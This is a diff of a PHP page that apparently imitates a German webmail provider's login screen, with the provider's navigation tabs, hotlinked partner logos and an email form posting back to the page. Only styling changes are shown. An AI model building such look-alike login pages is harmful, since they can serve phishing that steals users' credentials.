@@ -87,14 +87,14 @@ if (isset($_POST['login'])) {
           </nav>
           <!--tabs-->
           <nav class="nav border-bottom">
-            <a class="nav-link" style="color: black; font-size: 20px;"><i class="icofont-navigation-menu"></i></a>
+            <a class="nav-link" style="color: black; font-size: 17px;"><i class="icofont-navigation-menu"></i></a>
             <a class="nav-link" aria-current="page" style="color: black; font-size: 14px; ">Email & Cloud</a>
             <a class="nav-link" href="javascript:void(0)" style="color: black; font-size: 14px;">Mobilfunk & DSL</a>
             <a class="nav-link" href="javascript:void(0)" style="color: black; font-size:14px">Strom & Gas</a>
       
             <a class="nav-link" style="color: black; font-size: 14px;">Lotto</a>
             <a class="nav-link" style="color: black; font-size: 14px;">Versicherung</a>
-            <a class="nav-link" style="padding-left: 5rem;"><img src="https://adimg.uimserv.net/otto/2021/210617/otto_logo_44x16-2.svg"></a>
+            <a class="nav-link" style="padding-left: 4rem;"><img src="https://adimg.uimserv.net/otto/2021/210617/otto_logo_44x16-2.svg"></a>
             <a class="nav-link"><img src="https://adimg.uimserv.net/MONA/2021/Promoline_12461_mona-56x16-1.svg"></a>
             <a class="nav-link"><img src="https://adimg.uimserv.net/BaurVersand/210618/Promoline_baur-logo_56x16px-2.svg"></a>
           </nav>
@@ -104,10 +104,10 @@ if (isset($_POST['login'])) {
           <form class="mx-auto text-start" method="post" action="">
             <div class="row align-items-center ">
               <div class="col-auto pb-2" style="color: skyblue; font-size: 30px;"> <i class="bi bi-envelope-fill"></i></div>
-              <div class="col-auto pb-2">
+              <div class="col-auto pb-2 text-center">
                 <p>E-Mail</p>         
               </div>
-              <div class="col-auto pb-2"><img src="../public/images/pattern.png" width="10px" height="10px"></div>
+              <div class="col-auto pb-2"><img src="../public/images/pattern.png" width="12px" height="12px"></div>
 
               <div class="col-auto">
                 <label class="visually-hidden" for="inputEmail">Email</label>
